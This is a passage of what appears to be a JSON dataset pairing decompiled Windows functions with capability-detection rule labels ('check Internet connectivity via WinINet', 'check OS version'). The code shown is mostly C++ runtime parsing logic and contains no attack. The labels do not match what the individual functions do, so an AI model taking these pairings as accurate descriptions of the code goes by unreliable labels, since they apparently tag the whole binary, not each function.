        "decompiled_code": "\ncode ** __thiscall fcn.00418160(code **param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e2c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    var_20h = param_1;\n    fcn.00405a60(param_1 + 1);\n    ppcVar1 = var_20h;\n    if (var_8h != 0) {\n        fcn.00401e7e(var_20h);\n    }\n    *in_FS_OFFSET = var_18h;\n    return ppcVar1;\n}\n",
        "token_count": 253
    },
    "00401de3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401de3(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar3 = **(in_ECX + 0x46c + uVar1 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 340
    },
    "00401ded": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401ded(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    bool bVar3;\n    \n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if (iVar1 == 1) {\n        bVar3 = *(param_1 + 0x45c) == 2;\n    }\n    else {\n        if (iVar1 != 2) goto code_r0x0049bbcf;\n        bVar3 = *(param_1 + 0x45c) == 0;\n    }\n    if (bVar3) {\n        return CONCAT31(Var2, 1);\n    }\ncode_r0x0049bbcf:\n    return Var2 << 8;\n}\n",
        "token_count": 180
    },
    "00401e24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401e24(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int16_t *piVar11;\n    ushort *puVar12;\n    int32_t iVar13;\n    uint *puVar14;\n    char *arg_8h_00;\n    char *pcVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    int32_t unaff_EBP;\n    int32_t iVar18;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_59h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0xa8);\n    iVar13 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0xb4) = *(unaff_EBP + 8);\n    *(unaff_EBP + -100) = 0;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0xac) = iVar13;\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x18);\n    fcn.0040327e(*(*(unaff_EBP + 0x18) + 0x30));\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar5 = fcn.00401073(unaff_EBP + -0x90);\n        *(unaff_EBP + -0x60) = piVar5;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar5 = fcn.00405db7(unaff_EBP + -0x90);\n        *(unaff_EBP + -0x60) = piVar5;\n    }\n    fcn.004050a6();\n    *(unaff_EBP + -0x59) = 0;\n    *(unaff_EBP + -0x5b) = 0;\n    *(unaff_EBP + -0x58) = 0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 7;\n    *(unaff_EBP + -0x58) = 0;\n    iVar18 = *piVar5;\n    *(unaff_EBP + -4) = 4;\n    pcVar1 = *(iVar18 + 0x2c);\n    (**0x573000)(unaff_EBP + -0x9c);\n    (*pcVar1)();\n    puVar2 = *(unaff_EBP + -0x78);\n    *puVar2 = 0;\n    puVar2[4] = 0;\n    puVar2[5] = 0xf;\n    *puVar2 = 0;\n    uVar16 = 1;\n    *(unaff_EBP + -0x70) = 1;\n    uVar7 = *(*(unaff_EBP + -0x88) + 0x30);\n    *(unaff_EBP + -100) = 1;\n    fcn.0040327e(uVar7);\n    *(unaff_EBP + -4) = 6;\n    piVar5 = fcn.00403d87(unaff_EBP + -0x90);\n    *(unaff_EBP + -4) = 4;\n    *(unaff_EBP + -0x98) = piVar5;\n    fcn.004050a6();\n    var_14h = 0x54e418;\n    fcn.0040110e(0x54e40c, 0x54e418, *(unaff_EBP + -0x94));\n    uVar6 = 0;\n    *(unaff_EBP + -0x84) = 0;\n    do {\n        if (3 < uVar6) {\n            uVar6 = *(unaff_EBP + -0x48);\n            if (uVar6 < 2) goto code_r0x00471bf1;\n            piVar11 = unaff_EBP + -0x58;\n            if (7 < *(unaff_EBP + -0x44)) {\n                piVar11 = *(unaff_EBP + -0x58);\n            }\n            *(unaff_EBP + -0x5b) = *(unaff_EBP + -0x5b);\n            goto code_r0x00471b80;\n        }\n        cVar3 = *(unaff_EBP + -0x9c + uVar6);\n        if (cVar3 == ' ') {\ncode_r0x00471acb:\n            if (*(unaff_EBP + -0x84) != 3) {\n                *(unaff_EBP + -0x5a) = 0;\n                cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n                if (cVar3 == '\\0') {\n                    uVar7 = *(unaff_EBP + -0x68);\n                    do {\n                        if (*(iVar13 + 4) == '\\0') {\n                            fcn.004050a1();\n                        }\n                        pcVar1 = *(*piVar5 + 0x10);\n                        (**0x573000)(0x48, *(iVar13 + 6));\n                        cVar3 = (*pcVar1)();\n                        if (cVar3 == '\\0') break;\n                        *(unaff_EBP + -0x5a) = 1;\n                        fcn.004027a2();\n                        cVar3 = fcn.0040640b(uVar7);\n                        piVar5 = *(unaff_EBP + -0x98);\n                    } while (cVar3 == '\\0');\n                    uVar16 = *(unaff_EBP + -0x70);\n                }\n                if ((*(unaff_EBP + -0x9c + *(unaff_EBP + -0x84)) == ' ') && (*(unaff_EBP + -0x5a) == '\\0')) {\n                    cVar3 = '\\x01';\n                    *(unaff_EBP + -0x59) = 1;\n                    goto code_r0x004712bc;\n                }\n            }\ncode_r0x004712b9:\n            cVar3 = *(unaff_EBP + -0x59);\n        }\n        else {\n            if (cVar3 == '$') {\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x18);\n                (**0x573000)(unaff_EBP + -0x28);\n                (*pcVar1)();\n                uVar16 = uVar16 | 0x80;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                uVar7 = *(unaff_EBP + -0x68);\n                *(unaff_EBP + -4) = 7;\n                if (((*(*(unaff_EBP + -0x88) + 0x14) & 8) == 0) &&\n                   (cVar3 = fcn.0040640b(uVar7),  var_14h = uVar7,  cVar3 == '\\0')) {\n                    if (*(iVar13 + 4) == '\\0') {\n                        fcn.004050a1();\n                    }\n                    piVar11 = unaff_EBP + -0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        piVar11 = *(unaff_EBP + -0x28);\n                    }\n                    if (*(iVar13 + 6) == *piVar11) goto code_r0x004719f2;\ncode_r0x00471a2e:\n                    puVar12 = unaff_EBP + -0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        puVar12 = *(unaff_EBP + -0x28);\n                    }\n                    *(unaff_EBP + -0x18) = 0;\n                    *puVar12 = 0;\n                    var_14h = uVar7;\n                }\n                else {\ncode_r0x004719f2:\n                    if ((*(unaff_EBP + -0x84) == 3) && (*(unaff_EBP + -0x48) < 2)) {\n                        cVar3 = fcn.0040640b(uVar7);\n                        if (cVar3 == '\\0') {\n                            if (*(iVar13 + 4) == '\\0') {\n                                fcn.004050a1();\n                            }\n                            piVar11 = unaff_EBP + -0x28;\n                            if (7 < *(unaff_EBP + -0x14)) {\n                                piVar11 = *(unaff_EBP + -0x28);\n                            }\n                            var_14h = uVar7;\n                            if (*(iVar13 + 6) == *piVar11) goto code_r0x00471a43;\n                        }\n                        goto code_r0x00471a2e;\n                    }\n                }\ncode_r0x00471a43:\n                piVar11 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    piVar11 = *(unaff_EBP + -0x28);\n                }\n                var_18h = *(unaff_EBP + -0x68);\n                cVar3 = fcn.0040640b(var_18h);\n                if (cVar3 == '\\0') {\n                    iVar18 = *(unaff_EBP + -0x68);\n                    do {\n                        iVar10 = unaff_EBP + -0x28;\n                        if (7 < *(unaff_EBP + -0x14)) {\n                            iVar10 = *(unaff_EBP + -0x28);\n                        }\n                        if (piVar11 == iVar10 + *(unaff_EBP + -0x18) * 2) break;\n                        if (*(iVar13 + 4) == '\\0') {\n                            fcn.004050a1();\n                        }\n                        if (*(iVar13 + 6) != *piVar11) break;\n                        piVar11 = piVar11 + 1;\n                        fcn.004027a2();\n                        cVar3 = fcn.0040640b(iVar18);\n                        var_18h = iVar18;\n                    } while (cVar3 == '\\0');\n                    uVar16 = *(unaff_EBP + -0x70);\n                }\n                iVar18 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    iVar18 = *(unaff_EBP + -0x28);\n                }\n                if (piVar11 != iVar18 + *(unaff_EBP + -0x18) * 2) {\n                    *(unaff_EBP + -0x59) = 1;\n                }\n                *(unaff_EBP + -4) = 4;\ncode_r0x004717c7:\n                fcn.00402c34(var_18h, var_14h);\n                goto code_r0x004712b9;\n            }\n            if (cVar3 != '+') {\n                if (cVar3 != 'v') {\n                    if (cVar3 == 'x') goto code_r0x00471acb;\n                    goto code_r0x004712b9;\n                }\n                piVar5 = *(unaff_EBP + -0x60);\n                *(unaff_EBP + -0x7c) = 0;\n                uVar7 = fcn.004026d0();\n                *(unaff_EBP + -0x80) = uVar7;\n                pcVar1 = *(*piVar5 + 0x14);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar16 = uVar16 | 0x10000;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                *(unaff_EBP + -4) = 0xd;\n                if (*(unaff_EBP + -0x30) == 0) {\ncode_r0x00471551:\n                    var_14h = *(unaff_EBP + -0x68);\n                    cVar3 = fcn.0040640b(var_14h);\n                    if (cVar3 == '\\0') {\n                        do {\n                            if (*(iVar13 + 4) == '\\0') {\n                                fcn.004050a1();\n                            }\n                            uVar6 = fcn.00402ee6(*(unaff_EBP + -0x94), *(iVar13 + 6));\n                            if (9 < uVar6) break;\n                            *(unaff_EBP + -0xa4) = *(uVar6 + 0x54e40c);\n                            fcn.00404476(*(unaff_EBP + -0xa4));\n                            fcn.004027a2();\n                            cVar3 = fcn.0040640b(var_14h);\n                        } while (cVar3 == '\\0');\n                        uVar16 = *(unaff_EBP + -0x70);\n                    }\ncode_r0x004715b6:\n                    iVar4 = fcn.00402860();\n                    cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n                    if ((cVar3 == '\\0') && (iVar4 != 0)) {\n                        if (*(iVar13 + 4) == '\\0') {\n                            fcn.004050a1();\n                        }\n                        if (*(iVar13 + 6) != iVar4) goto code_r0x00471677;\n                        fcn.004027a2();\n                        cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n                        iVar18 = *(unaff_EBP + -0x80);\n                        while (iVar10 = *(unaff_EBP + -0x7c),  cVar3 == '\\0') {\n                            if (iVar18 <= iVar10) goto code_r0x0047167d;\n                            if (*(iVar13 + 4) == '\\0') {\n                                fcn.004050a1();\n                            }\n                            uVar6 = fcn.00402ee6(*(unaff_EBP + -0x94), *(iVar13 + 6));\n                            if (9 < uVar6) {\n                                iVar10 = *(unaff_EBP + -0x7c);\n                                goto code_r0x00471671;\n                            }\n                            *(unaff_EBP + -0xa8) = *(uVar6 + 0x54e40c);\n                            fcn.00404476(*(unaff_EBP + -0xa8));\n                            *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x7c) + 1;\n                            fcn.004027a2();\n                            cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n                        }\n                        if (iVar10 < iVar18) {\ncode_r0x00471671:\n                            *(unaff_EBP + -0x59) = 1;\n                        }\n                    }\n                    else {\ncode_r0x00471677:\n                        iVar18 = *(unaff_EBP + -0x80);\n                        iVar10 = *(unaff_EBP + -0x7c);\n                    }\ncode_r0x0047167d:\n                    if (*(*(unaff_EBP + -0x78) + 0x10) == 0) {\n                        *(unaff_EBP + -0x59) = 1;\n                    }\n                    else if (iVar10 < iVar18) {\n                        iVar18 = iVar18 - iVar10;\n                        do {\n                            fcn.00404476(0x30);\n                            iVar18 = iVar18 + -1;\n                        } while (iVar18 != 0);\n                        iVar13 = *(unaff_EBP + -0xac);\n                    }\n                }\n                else {\n                    uVar6 = fcn.004068ac();\n                    *(unaff_EBP + -0x74) = uVar6 & 0xffff;\n                    if ((uVar6 & 0xffff) == 0) goto code_r0x00471551;\n                    puVar8 = unaff_EBP + -0x40;\n                    if (0xf < *(unaff_EBP + -0x2c)) {\n                        puVar8 = *(unaff_EBP + -0x40);\n                    }\n                    if (0x7e < *puVar8) goto code_r0x00471551;\n                    *(unaff_EBP + -0x28) = 0;\n                    *(unaff_EBP + -0x18) = 0;\n                    *(unaff_EBP + -0x14) = 0xf;\n                    *(unaff_EBP + -0x28) = 0;\n                    var_14h = 0;\n                    *(unaff_EBP + -4) = 0xf;\n                    fcn.00404476(0);\n                    iVar18 = 0;\n                    cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n                    if (cVar3 == '\\0') {\n                        iVar10 = *(unaff_EBP + -0x28);\n                        *(unaff_EBP + -0x6c) = iVar10;\n                        do {\n                            if (*(iVar13 + 4) == '\\0') {\n                                fcn.004050a1();\n                            }\n                            uVar6 = fcn.00402ee6(*(unaff_EBP + -0x94), *(iVar13 + 6));\n                            if (uVar6 < 10) {\n                                *(unaff_EBP + -0xa0) = *(uVar6 + 0x54e40c);\n                                fcn.00404476(*(unaff_EBP + -0xa0));\n                                iVar9 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    iVar9 = iVar10;\n                                }\n                                if (*(iVar9 + iVar18) != '\\x7f') {\n                                    iVar9 = unaff_EBP + -0x28;\n                                    if (0xf < *(unaff_EBP + -0x14)) {\n                                        iVar9 = iVar10;\n                                    }\n                                    *(iVar9 + iVar18) = *(iVar9 + iVar18) + '\\x01';\n                                    goto code_r0x0047141a;\n                                }\n                            }\n                            else {\n                                iVar9 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    iVar9 = iVar10;\n                                }\n                                if (*(iVar9 + iVar18) == '\\0') break;\n                                iVar4 = *(iVar13 + 6);\n                                if (*(iVar13 + 4) == '\\0') {\n                                    fcn.004050a1();\n                                    iVar4 = *(iVar13 + 6);\n                                }\n                                if (iVar4 != *(unaff_EBP + -0x74)) break;\n                                fcn.00404476(0);\n                                iVar18 = iVar18 + 1;\ncode_r0x0047141a:\n                                iVar10 = *(unaff_EBP + -0x28);\n                                *(unaff_EBP + -0x6c) = iVar10;\n                            }\n                            fcn.004027a2();\n                            cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n                        } while (cVar3 == '\\0');\n                        uVar16 = *(unaff_EBP + -0x70);\n                        if (iVar18 == 0) {\n                            arg_8h_00 = *(unaff_EBP + -0x6c);\n                            goto code_r0x00471467;\n                        }\n                        iVar10 = unaff_EBP + -0x28;\n                        if (0xf < *(unaff_EBP + -0x14)) {\n                            iVar10 = *(unaff_EBP + -0x6c);\n                        }\n                        arg_8h_00 = *(unaff_EBP + -0x6c);\n                        if ('\\0' < *(iVar10 + iVar18)) {\n                            iVar18 = iVar18 + 1;\n                            goto code_r0x00471467;\n                        }\n                        cVar3 = '\\x01';\n                        *(unaff_EBP + -0x59) = 1;\n                    }\n                    else {\n                        arg_8h_00 = *(unaff_EBP + -0x28);\ncode_r0x00471467:\n                        cVar3 = *(unaff_EBP + -0x59);\n                    }\n                    pcVar15 = unaff_EBP + -0x40;\n                    *(unaff_EBP + -0x6c) = pcVar15;\n                    if (0xf < *(unaff_EBP + -0x2c)) {\n                        pcVar15 = *(unaff_EBP + -0x40);\n                        *(unaff_EBP + -0x6c) = pcVar15;\n                    }\n                    if (cVar3 == '\\0') {\n                        while ((iVar18 != 0 && (cVar3 = *pcVar15,  cVar3 != '\\x7f'))) {\n                            iVar18 = iVar18 + -1;\n                            if (iVar18 != 0) {\n                                pcVar15 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    pcVar15 = arg_8h_00;\n                                }\n                                if (cVar3 == pcVar15[iVar18]) goto code_r0x004714a8;\ncode_r0x004714ca:\n                                *(unaff_EBP + -0x59) = 1;\n                                goto code_r0x004714ce;\n                            }\ncode_r0x004714a8:\n                            if (iVar18 == 0) {\n                                pcVar15 = unaff_EBP + -0x28;\n                                if (0xf < *(unaff_EBP + -0x14)) {\n                                    pcVar15 = arg_8h_00;\n                                }\n                                if (cVar3 < *pcVar15) goto code_r0x004714ca;\n                            }\n                            pcVar15 = *(unaff_EBP + -0x6c);\n                            if ('\\0' < pcVar15[1]) {\n                                pcVar15 = pcVar15 + 1;\n                                *(unaff_EBP + -0x6c) = pcVar15;\n                            }\n                        }\n                        *(unaff_EBP + -4) = 0xd;\n                        if (0xf < *(unaff_EBP + -0x14)) {\n                            uVar6 = *(unaff_EBP + -0x14) + 1;\n                            *(unaff_EBP + -0x74) = arg_8h_00;\n                            *(unaff_EBP + -0x6c) = uVar6;\n                            if (0xfff < uVar6) {\n                                fcn.00404070(unaff_EBP + -0x74, unaff_EBP + -0x6c);\n                                arg_8h_00 = *(unaff_EBP + -0x74);\n                            }\n                            fcn.00401a32(arg_8h_00);\n                        }\n                        goto code_r0x004715b6;\n                    }\ncode_r0x004714ce:\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        uVar6 = *(unaff_EBP + -0x14) + 1;\n                        *(unaff_EBP + -0x80) = arg_8h_00;\n                        *(unaff_EBP + -0x74) = uVar6;\n                        if (0xfff < uVar6) {\n                            fcn.00404070(unaff_EBP + -0x80, unaff_EBP + -0x74);\n                            arg_8h_00 = *(unaff_EBP + -0x80);\n                        }\n                        fcn.00401a32(arg_8h_00);\n                    }\n                }\n                *(unaff_EBP + -4) = 4;\n                fcn.004029b9();\n                goto code_r0x004712b9;\n            }\n            cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n            if (cVar3 != '\\0') goto code_r0x004712b9;\n            pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n            (**0x573000)(unaff_EBP + -0x28);\n            (*pcVar1)();\n            uVar6 = uVar16 | 0x102;\n            *(unaff_EBP + -4) = 8;\n            *(unaff_EBP + -100) = uVar6;\n            if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x00471748:\n                *(unaff_EBP + -0x5a) = 0;\n            }\n            else {\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar6 = uVar16 | 0x306;\n                *(unaff_EBP + -4) = 9;\n                piVar11 = unaff_EBP + -0x40;\n                *(unaff_EBP + -100) = uVar6;\n                if (7 < *(unaff_EBP + -0x2c)) {\n                    piVar11 = *(unaff_EBP + -0x40);\n                }\n                if (*(iVar13 + 4) == '\\0') {\n                    fcn.004050a1();\n                }\n                iVar4 = *(iVar13 + 6);\n                *(unaff_EBP + -0x5a) = 1;\n                if (*piVar11 != iVar4) goto code_r0x00471748;\n            }\n            if ((uVar6 & 4) != 0) {\n                uVar6 = uVar6 & 0xfffffffb;\n                *(unaff_EBP + -100) = uVar6;\n                fcn.00402c34();\n            }\n            *(unaff_EBP + -4) = 4;\n            if ((uVar6 & 2) != 0) {\n                uVar6 = uVar6 & 0xfffffffd;\n                *(unaff_EBP + -100) = uVar6;\n                fcn.00402c34();\n            }\n            if (*(unaff_EBP + -0x5a) != '\\0') {\n                fcn.004027a2();\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                *(unaff_EBP + -0xb0) = 0;\n                var_18h = unaff_EBP + -0x40;\n                var_14h = *(unaff_EBP + -0xb0);\n                uVar16 = uVar6 | 0x400;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                fcn.00404237(var_18h);\n                goto code_r0x004717c7;\n            }\n            pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n            (**0x573000)(unaff_EBP + -0x28);\n            (*pcVar1)();\n            uVar17 = uVar6 | 0x808;\n            *(unaff_EBP + -4) = 10;\n            *(unaff_EBP + -100) = uVar17;\n            if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x00471852:\n                *(unaff_EBP + -0x5a) = 0;\n            }\n            else {\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar17 = uVar6 | 0x1818;\n                *(unaff_EBP + -4) = 0xb;\n                piVar11 = unaff_EBP + -0x40;\n                *(unaff_EBP + -100) = uVar17;\n                if (7 < *(unaff_EBP + -0x2c)) {\n                    piVar11 = *(unaff_EBP + -0x40);\n                }\n                if (*(iVar13 + 4) == '\\0') {\n                    fcn.004050a1();\n                }\n                iVar4 = *(iVar13 + 6);\n                *(unaff_EBP + -0x5a) = 1;\n                if (*piVar11 != iVar4) goto code_r0x00471852;\n            }\n            if ((uVar17 & 0x10) != 0) {\n                uVar17 = uVar17 & 0xffffffef;\n                *(unaff_EBP + -100) = uVar17;\n                fcn.00402c34();\n            }\n            *(unaff_EBP + -4) = 4;\n            if ((uVar17 & 8) != 0) {\n                uVar17 = uVar17 & 0xfffffff7;\n                *(unaff_EBP + -100) = uVar17;\n                fcn.00402c34();\n            }\n            if (*(unaff_EBP + -0x5a) != '\\0') {\n                fcn.004027a2();\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                *(unaff_EBP + -0x8c) = 0;\n                var_14h = *(unaff_EBP + -0x8c);\n                uVar16 = uVar17 | 0x2000;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                fcn.00404237(unaff_EBP + -0x40);\n                fcn.00402c34(unaff_EBP + -0x40, var_14h);\n                *(unaff_EBP + -0x5b) = 1;\n                goto code_r0x004712b9;\n            }\n            pcVar1 = *(**(unaff_EBP + -0x60) + 0x1c);\n            (**0x573000)(unaff_EBP + -0x28);\n            (*pcVar1)();\n            uVar16 = uVar17 | 0x4020;\n            *(unaff_EBP + -4) = 0xc;\n            *(unaff_EBP + -0x70) = uVar16;\n            *(unaff_EBP + -100) = uVar16;\n            if (*(unaff_EBP + -0x18) == 0) {\ncode_r0x00471940:\n                *(unaff_EBP + -0x5a) = 0;\n            }\n            else {\n                pcVar1 = *(**(unaff_EBP + -0x60) + 0x20);\n                (**0x573000)(unaff_EBP + -0x40);\n                (*pcVar1)();\n                uVar16 = uVar17 | 0xc060;\n                *(unaff_EBP + -0x5a) = 1;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                if (*(unaff_EBP + -0x30) != 0) goto code_r0x00471940;\n            }\n            if ((uVar16 & 0x40) != 0) {\n                uVar16 = uVar16 & 0xffffffbf;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                fcn.00402c34();\n            }\n            *(unaff_EBP + -4) = 4;\n            if ((uVar16 & 0x20) != 0) {\n                uVar16 = uVar16 & 0xffffffdf;\n                *(unaff_EBP + -0x70) = uVar16;\n                *(unaff_EBP + -100) = uVar16;\n                fcn.00402c34();\n            }\n            cVar3 = *(unaff_EBP + -0x59);\n            if (*(unaff_EBP + -0x5a) != '\\0') {\n                *(unaff_EBP + -0x5b) = 1;\n            }\n        }\ncode_r0x004712bc:\n        *(unaff_EBP + -0x84) = *(unaff_EBP + -0x84) + 1;\n        uVar6 = *(unaff_EBP + -0x84);\n        piVar5 = *(unaff_EBP + -0x98);\n    } while (cVar3 == '\\0');\n    goto code_r0x00471bdb;\ncode_r0x00471b80:\n    piVar11 = piVar11 + 1;\n    iVar18 = unaff_EBP + -0x58;\n    if (7 < *(unaff_EBP + -0x44)) {\n        iVar18 = *(unaff_EBP + -0x58);\n    }\n    if (piVar11 == iVar18 + uVar6 * 2) goto code_r0x00471bc8;\n    cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n    if (cVar3 != '\\0') goto code_r0x00471bc5;\n    if (*(iVar13 + 4) == '\\0') {\n        fcn.004050a1();\n    }\n    if (*(iVar13 + 6) != *piVar11) goto code_r0x00471bc5;\n    fcn.004027a2();\n    uVar6 = *(unaff_EBP + -0x48);\n    goto code_r0x00471b80;\ncode_r0x00471bc5:\n    uVar6 = *(unaff_EBP + -0x48);\ncode_r0x00471bc8:\n    iVar13 = unaff_EBP + -0x58;\n    if (7 < *(unaff_EBP + -0x44)) {\n        iVar13 = *(unaff_EBP + -0x58);\n    }\n    if (piVar11 == iVar13 + uVar6 * 2) {\ncode_r0x00471bf1:\n        if (*(unaff_EBP + -0x5b) != '\\0') {\n            fcn.00405736(0, 1, 0x2d);\n        }\n        goto code_r0x00471c07;\n    }\ncode_r0x00471bdb:\n    puVar2 = *(unaff_EBP + -0x78);\n    puVar14 = puVar2;\n    if (0xf < puVar2[5]) {\n        puVar14 = *puVar2;\n    }\n    puVar2[4] = 0;\n    *puVar14 = 0;\ncode_r0x00471c07:\n    if (7 < *(unaff_EBP + -0x44)) {\n        uVar7 = *(unaff_EBP + -0x58);\n        uVar6 = *(unaff_EBP + -0x44) * 2 + 2;\n        *(unaff_EBP + -0x88) = uVar6;\n        *(unaff_EBP + -0x74) = uVar7;\n        if (0xfff < uVar6) {\n            fcn.00404070(unaff_EBP + -0x74, unaff_EBP + -0x88);\n            uVar7 = *(unaff_EBP + -0x74);\n        }\n        fcn.00401a32(uVar7);\n    }\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 8411
    },
    "00401e56": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl\nfcn.00401e56(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint noname_9, uint noname_10, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    char cVar8;\n    int32_t iVar9;\n    int32_t unaff_EBP;\n    code *pcVar10;\n    uint32_t uVar11;\n    int32_t arg_18h_00;\n    char *pcVar12;\n    uint var_ech;\n    uint var_e4h;\n    uint var_dch;\n    uint var_d4h;\n    uint var_cch;\n    uint 